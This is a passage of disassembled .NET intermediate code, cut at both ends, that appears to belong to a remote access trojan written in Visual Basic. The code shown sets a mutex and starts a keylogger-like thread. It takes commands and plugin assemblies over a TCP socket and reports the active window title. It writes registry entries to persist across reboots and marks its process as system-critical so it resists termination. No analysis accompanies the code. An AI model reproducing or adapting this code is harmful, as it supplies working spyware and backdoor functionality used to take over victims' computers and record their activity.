      IL_00c7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00cc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d1:  leave.s    IL_00d3

    }  // end handler
    IL_00d3:  ldc.i4     0x1388
    IL_00d8:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_00dd:  ldc.i4.0
    IL_00de:  stloc.0
    IL_00df:  ldc.i4.1
    IL_00e0:  ldsfld     string j.OK::RG
    IL_00e5:  ldloca.s   V_0
    IL_00e7:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                               string,
                                                                               bool&)
    IL_00ec:  stsfld     object j.OK::MT
    IL_00f1:  ldloc.0
    IL_00f2:  brtrue.s   IL_00f9

    IL_00f4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00f9:  call       void j.OK::INS()
    IL_00fe:  ldsfld     bool j.OK::Idr
    IL_0103:  brtrue.s   IL_0128

    IL_0105:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_010a:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_010f:  stsfld     string j.OK::EXE
    IL_0114:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0119:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_011e:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0123:  stsfld     string j.OK::DR
    IL_0128:  ldnull
    IL_0129:  ldftn      void j.OK::RC()
    IL_012f:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0134:  ldc.i4.1
    IL_0135:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_013a:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    .try
    {
      IL_013f:  newobj     instance void j.kl::.ctor()
      IL_0144:  stsfld     class j.kl j.OK::kq
      IL_0149:  ldsfld     class j.kl j.OK::kq
      IL_014e:  ldftn      instance void j.kl::WRK()
      IL_0154:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_0159:  ldc.i4.1
      IL_015a:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_015f:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_0164:  leave.s    IL_0181

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0166:  dup
      IL_0167:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_016c:  stloc.s    V_4
      IL_016e:  ldloc.s    V_4
      IL_0170:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0175:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017f:  leave.s    IL_0181

    }  // end handler
    IL_0181:  ldc.i4.0
    IL_0182:  stloc.1
    IL_0183:  ldstr      ""
    IL_0188:  stloc.2
    IL_0189:  ldsfld     bool j.OK::BD
    IL_018e:  brfalse.s  IL_01c4

    .try
    {
      IL_0190:  ldnull
      IL_0191:  ldftn      void j.OK::_Lambda__2(object,
                                                 class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_0197:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_019c:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_01a1:  ldc.i4.1
      IL_01a2:  call       void j.OK::pr(int32)
      IL_01a7:  leave.s    IL_01c4

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01a9:  dup
      IL_01aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01af:  stloc.s    V_5
      IL_01b1:  ldloc.s    V_5
      IL_01b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01bd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01c2:  leave.s    IL_01c4

    }  // end handler
    IL_01c4:  ldc.i4     0x3e8
    IL_01c9:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_01ce:  ldsfld     bool j.OK::Cn
    IL_01d3:  brtrue.s   IL_01db

    IL_01d5:  ldstr      ""
    IL_01da:  stloc.2
    IL_01db:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    .try
    {
      IL_01e0:  ldloc.1
      IL_01e1:  ldc.i4.1
      IL_01e2:  add.ovf
      IL_01e3:  stloc.1
      IL_01e4:  ldloc.1
      IL_01e5:  ldc.i4.5
      IL_01e6:  bne.un.s   IL_0219

      .try
      {
        IL_01e8:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_01ed:  ldc.i4     0x400
        IL_01f2:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_01f7:  callvirt   instance void [System]System.Diagnostics.Process::set_MinWorkingSet(native int)
        IL_01fc:  leave.s    IL_0219

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_01fe:  dup
        IL_01ff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0204:  stloc.s    V_6
        IL_0206:  ldloc.s    V_6
        IL_0208:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_020d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0212:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0217:  leave.s    IL_0219

      }  // end handler
      IL_0219:  ldloc.1
      IL_021a:  ldc.i4.8
      IL_021b:  blt.s      IL_024b

      IL_021d:  ldc.i4.0
      IL_021e:  stloc.1
      IL_021f:  call       string j.OK::ACT()
      IL_0224:  stloc.s    V_7
      IL_0226:  ldloc.2
      IL_0227:  ldloc.s    V_7
      IL_0229:  ldc.i4.0
      IL_022a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_022f:  brfalse.s  IL_024b

      IL_0231:  ldloc.s    V_7
      IL_0233:  stloc.2
      IL_0234:  ldstr      "act"
      IL_0239:  ldsfld     string j.OK::Y
      IL_023e:  ldloc.s    V_7
      IL_0240:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0245:  call       bool j.OK::Send(string)
      IL_024a:  pop
      IL_024b:  ldsfld     bool j.OK::Isu
      IL_0250:  brfalse    IL_03b0

      .try
      {
        IL_0255:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_025a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_025f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_0264:  ldsfld     string j.OK::sf
        IL_0269:  ldstr      "\\"
        IL_026e:  ldsfld     string j.OK::RG
        IL_0273:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0278:  ldstr      ""
        IL_027d:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0282:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0287:  ldstr      "\""
        IL_028c:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_0291:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0296:  ldstr      "\" .."
        IL_029b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02a0:  ldc.i4.0
        IL_02a1:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_02a6:  brfalse.s  IL_02e5

        IL_02a8:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_02ad:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_02b2:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_02b7:  ldsfld     string j.OK::sf
        IL_02bc:  ldc.i4.1
        IL_02bd:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_02c2:  ldsfld     string j.OK::RG
        IL_02c7:  ldstr      "\""
        IL_02cc:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_02d1:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_02d6:  ldstr      "\" .."
        IL_02db:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02e0:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_02e5:  leave.s    IL_0302

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02e7:  dup
        IL_02e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02ed:  stloc.s    V_8
        IL_02ef:  ldloc.s    V_8
        IL_02f1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02f6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02fb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0300:  leave.s    IL_0302

      }  // end handler
      IL_0302:  nop
      .try
      {
        IL_0303:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_0308:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_030d:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0312:  ldsfld     string j.OK::sf
        IL_0317:  ldstr      "\\"
        IL_031c:  ldsfld     string j.OK::RG
        IL_0321:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0326:  ldstr      ""
        IL_032b:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0330:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0335:  ldstr      "\""
        IL_033a:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_033f:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0344:  ldstr      "\" .."
        IL_0349:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_034e:  ldc.i4.0
        IL_034f:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_0354:  brfalse.s  IL_0393

        IL_0356:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_035b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0360:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0365:  ldsfld     string j.OK::sf
        IL_036a:  ldc.i4.1
        IL_036b:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_0370:  ldsfld     string j.OK::RG
        IL_0375:  ldstr      "\""
        IL_037a:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_037f:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0384:  ldstr      "\" .."
        IL_0389:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_038e:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0393:  leave.s    IL_03b0

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0395:  dup
        IL_0396:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_039b:  stloc.s    V_9
        IL_039d:  ldloc.s    V_9
        IL_039f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03a4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03ae:  leave.s    IL_03b0

      }  // end handler
      IL_03b0:  leave      IL_01c4

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03b5:  dup
      IL_03b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03bb:  stloc.s    V_10
      IL_03bd:  ldloc.s    V_10
      IL_03bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03ce:  leave      IL_01c4
    }  // end handler
  } // end of method OK::ko

  .method public static string  md5(uint8[] B) cil managed
  {
    // Code size       60 (0x3c)
    .maxstack  3
    .locals init (string V_0,
             uint8 V_1,
             uint8[] V_2,
             int32 V_3)
    IL_0000:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0005:  ldarg.0
    IL_0006:  call       instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000b:  starg.s    B
    IL_000d:  ldstr      ""
    IL_0012:  stloc.0
    IL_0013:  ldarg.0
    IL_0014:  stloc.2
    IL_0015:  ldc.i4.0
    IL_0016:  stloc.3
    IL_0017:  br.s       IL_0034

    IL_0019:  ldloc.2
    IL_001a:  ldloc.3
    IL_001b:  ldelem.u1
    IL_001c:  stloc.1
    IL_001d:  ldloc.0
    IL_001e:  ldloca.s   V_1
    IL_0020:  ldstr      "x2"
    IL_0025:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_002a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_002f:  stloc.0
    IL_0030:  ldloc.3
    IL_0031:  ldc.i4.1
    IL_0032:  add.ovf
    IL_0033:  stloc.3
    IL_0034:  ldloc.3
    IL_0035:  ldloc.2
    IL_0036:  ldlen
    IL_0037:  conv.i4
    IL_0038:  blt.s      IL_0019

    IL_003a:  ldloc.0
    IL_003b:  ret
  } // end of method OK::md5

  .method private static pinvokeimpl("ntdll" winapi) 
          int32  NtSetInformationProcess(native int hProcess,
                                         int32 processInformationClass,
                                         int32& processInformation,
                                         int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static object  Plugin(uint8[] b,
                                       string c) cil managed
  {
    // Code size       114 (0x72)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Reflection.Module V_1,
             class [mscorlib]System.Reflection.Module[] V_2,
             int32 V_3,
             class [mscorlib]System.Type V_4,
             class [mscorlib]System.Type[] V_5,
             int32 V_6)
    IL_0000:  ldarg.0
    IL_0001:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0006:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000b:  stloc.2
    IL_000c:  ldc.i4.0
    IL_000d:  stloc.3
    IL_000e:  br.s       IL_0068

    IL_0010:  ldloc.2
    IL_0011:  ldloc.3
    IL_0012:  ldelem.ref
    IL_0013:  stloc.1
    IL_0014:  ldloc.1
    IL_0015:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_001a:  stloc.s    V_5
    IL_001c:  ldc.i4.0
    IL_001d:  stloc.s    V_6
    IL_001f:  br.s       IL_005c

    IL_0021:  ldloc.s    V_5
    IL_0023:  ldloc.s    V_6
    IL_0025:  ldelem.ref
    IL_0026:  stloc.s    V_4
    IL_0028:  ldloc.s    V_4
    IL_002a:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_002f:  ldstr      "."
    IL_0034:  ldarg.1
    IL_0035:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003a:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_003f:  brfalse.s  IL_0056

    IL_0041:  ldloc.1
    IL_0042:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_0047:  ldloc.s    V_4
    IL_0049:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_004e:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_0053:  stloc.0
    IL_0054:  br.s       IL_0070

    IL_0056:  ldloc.s    V_6
    IL_0058:  ldc.i4.1
    IL_0059:  add.ovf
    IL_005a:  stloc.s    V_6
    IL_005c:  ldloc.s    V_6
    IL_005e:  ldloc.s    V_5
    IL_0060:  ldlen
    IL_0061:  conv.i4
    IL_0062:  blt.s      IL_0021

    IL_0064:  ldloc.3
    IL_0065:  ldc.i4.1
    IL_0066:  add.ovf
    IL_0067:  stloc.3
    IL_0068:  ldloc.3
    IL_0069:  ldloc.2
    IL_006a:  ldlen
    IL_006b:  conv.i4
    IL_006c:  blt.s      IL_0010

    IL_006e:  ldnull
    IL_006f:  stloc.0
    IL_0070:  ldloc.0
    IL_0071:  ret
  } // end of method OK::Plugin

  .method public static void  pr(int32 i) cil managed
  {
    // Code size       49 (0x31)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0005:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000a:  ldc.i4.s   29
      IL_000c:  ldarga.s   i
      IL_000e:  ldc.i4.4
      IL_000f:  call       int32 j.OK::NtSetInformationProcess(native int,
                                                               int32,
                                                               int32&,
                                                               int32)
      IL_0014:  pop
      IL_0015:  leave.s    IL_0030

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0017:  dup
      IL_0018:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001d:  stloc.0
      IL_001e:  ldloc.0
      IL_001f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0024:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0029:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002e:  leave.s    IL_0030

    }  // end handler
    IL_0030:  ret
  } // end of method OK::pr

  .method public static void  RC() cil managed
  {
    // Code size       565 (0x235)
    .maxstack  8
    .locals init (int64 V_0,
             int32 V_1,
             int64 V_2,
             int32 V_3,
             string V_4,
             int32 V_5,
             char V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8)
    IL_0000:  ldstr      ""
    IL_0005:  stsfld     string j.OK::lastcap
    IL_000a:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_000f:  brfalse    IL_01d2

    IL_0014:  ldc.i4.m1
    IL_0015:  conv.i8
    IL_0016:  stloc.0
    IL_0017:  ldc.i4.0
    IL_0018:  stloc.1
    .try
    {
      IL_0019:  ldloc.1
      IL_001a:  ldc.i4.1
      IL_001b:  add.ovf
      IL_001c:  stloc.1
      IL_001d:  ldloc.1
      IL_001e:  ldc.i4.s   10
      IL_0020:  bne.un.s   IL_002a

      IL_0022:  ldc.i4.0
      IL_0023:  stloc.1
      IL_0024:  ldc.i4.1
      IL_0025:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_002a:  ldsfld     bool j.OK::Cn
      IL_002f:  brtrue.s   IL_0036

      IL_0031:  leave      IL_01d2

      IL_0036:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_003b:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0040:  ldc.i4.1
      IL_0041:  bge.s      IL_0055

      IL_0043:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0048:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_004d:  ldc.i4.m1
      IL_004e:  ldc.i4.0
      IL_004f:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_0054:  pop
      IL_0055:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_005a:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_005f:  ldc.i4.0
      IL_0060:  ble        IL_01b5

      IL_0065:  ldloc.0
      IL_0066:  ldc.i4.m1
      IL_0067:  conv.i8
      IL_0068:  bne.un.s   IL_00e9

      IL_006a:  ldstr      ""
      IL_006f:  stloc.s    V_4
      IL_0071:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0076:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_007b:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_0080:  stloc.s    V_5
      IL_0082:  ldloc.s    V_5
      IL_0084:  ldc.i4.m1
      IL_0085:  beq.s      IL_008d

      IL_0087:  ldloc.s    V_5
      IL_0089:  brfalse.s  IL_0092

      IL_008b:  br.s       IL_00c4

      IL_008d:  leave      IL_01d2

      IL_0092:  ldloc.s    V_4
      IL_0094:  call       int64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToLong(string)
      IL_0099:  stloc.0
      IL_009a:  ldstr      ""
      IL_009f:  stloc.s    V_4
      IL_00a1:  ldloc.0
      IL_00a2:  brtrue.s   IL_00b2

      IL_00a4:  ldstr      ""
      IL_00a9:  call       bool j.OK::Send(string)
      IL_00ae:  pop
      IL_00af:  ldc.i4.m1
      IL_00b0:  conv.i8
      IL_00b1:  stloc.0
      IL_00b2:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00b7:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00bc:  ldc.i4.0
      IL_00bd:  bgt.s      IL_0055

      IL_00bf:  br         IL_0019

      IL_00c4:  ldloc.s    V_4
      IL_00c6:  ldloc.s    V_5
      IL_00c8:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_00cd:  stloc.s    V_6
      IL_00cf:  ldloca.s   V_6
      IL_00d1:  call       instance string [mscorlib]System.Char::ToString()
      IL_00d6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00db:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_00e0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00e5:  stloc.s    V_4
      IL_00e7:  br.s       IL_0071

      IL_00e9:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00ee:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00f3:  ldc.i4.1
      IL_00f4:  add.ovf
      IL_00f5:  ldc.i4.1
      IL_00f6:  sub.ovf
      IL_00f7:  ldc.i4.1
      IL_00f8:  add.ovf
      IL_00f9:  newarr     [mscorlib]System.Byte
      IL_00fe:  stsfld     uint8[] j.OK::b
      IL_0103:  ldloc.0
      IL_0104:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0109:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_010e:  sub.ovf
      IL_010f:  stloc.2
      IL_0110:  ldsfld     uint8[] j.OK::b
      IL_0115:  ldlen
      IL_0116:  conv.i4
      IL_0117:  conv.i8
      IL_0118:  ldloc.2
      IL_0119:  ble.s      IL_0130

      IL_011b:  ldloc.2
      IL_011c:  ldc.i4.1
      IL_011d:  conv.i8
      IL_011e:  sub.ovf
      IL_011f:  conv.ovf.i4
      IL_0120:  ldc.i4.1
      IL_0121:  add.ovf
      IL_0122:  ldc.i4.1
      IL_0123:  sub.ovf
      IL_0124:  ldc.i4.1
      IL_0125:  add.ovf
      IL_0126:  newarr     [mscorlib]System.Byte
      IL_012b:  stsfld     uint8[] j.OK::b
      IL_0130:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0135:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_013a:  ldsfld     uint8[] j.OK::b
      IL_013f:  ldc.i4.0
      IL_0140:  ldsfld     uint8[] j.OK::b
      IL_0145:  ldlen
      IL_0146:  conv.i4
      IL_0147:  ldc.i4.0
      IL_0148:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_014d:  stloc.3
      IL_014e:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0153:  ldsfld     uint8[] j.OK::b
      IL_0158:  ldc.i4.0
      IL_0159:  ldloc.3
      IL_015a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_015f:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0164:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0169:  ldloc.0
      IL_016a:  bne.un     IL_0019

      IL_016f:  ldc.i4.m1
      IL_0170:  conv.i8
      IL_0171:  stloc.0
      IL_0172:  ldnull
      IL_0173:  ldftn      void j.OK::_Lambda__1(object)
      IL_0179:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_017e:  ldc.i4.1
      IL_017f:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_0184:  dup
      IL_0185:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_018a:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_018f:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_0194:  ldc.i4.s   100
      IL_0196:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_019b:  pop
      IL_019c:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01a1:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_01a6:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_01ab:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01b0:  br         IL_0019

      IL_01b5:  leave.s    IL_01d2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01b7:  dup
      IL_01b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
